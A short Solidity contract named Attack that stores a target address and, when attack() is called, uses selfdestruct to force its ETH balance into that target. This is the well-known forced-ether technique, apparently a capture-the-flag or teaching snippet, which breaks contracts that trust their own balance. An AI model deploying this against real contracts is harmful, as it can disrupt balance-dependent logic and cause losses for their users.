// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(target));  // Send all ETH to target via selfdestruct
    }
}